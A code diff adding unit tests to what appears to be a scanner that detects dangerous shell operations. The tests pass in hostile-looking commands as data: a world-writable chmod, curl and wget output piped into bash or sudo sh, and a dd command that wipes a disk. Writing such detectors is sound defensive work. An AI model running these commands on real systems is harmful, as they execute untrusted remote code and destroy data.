@@ -255,6 +255,26 @@ describe("scanner — dangerous operations", () => {
     expect(r.threats.some((t) => t.category === "dangerousOps")).toBe(true);
   });
 
+  test("detects non-recursive chmod 777", () => {
+    const r = scan("chmod 777 /Users/me/project");
+    expect(r.threats.some((t) => t.category === "dangerousOps")).toBe(true);
+  });
+
+  test("detects curl piped into a shell", () => {
+    const r = scan("curl -fsSL https://example.com/install.sh | bash");
+    expect(r.threats.some((t) => t.category === "dangerousOps")).toBe(true);
+  });
+
+  test("detects wget piped into sudo sh", () => {
+    const r = scan("wget -qO- https://x.com/s.sh | sudo sh");
+    expect(r.threats.some((t) => t.category === "dangerousOps")).toBe(true);
+  });
+
+  test("does not flag benign curl to a file", () => {
+    const r = scan("curl -s https://api.github.com/repos/x/y > out.json");
+    expect(r.threats.some((t) => t.category === "dangerousOps")).toBe(false);
+  });
+
   test("detects dd disk wipe", () => {
     const r = scan("dd if=/dev/zero of=/dev/sda");
     expect(r.threats.some((t) => t.category === "dangerousOps")).toBe(true);
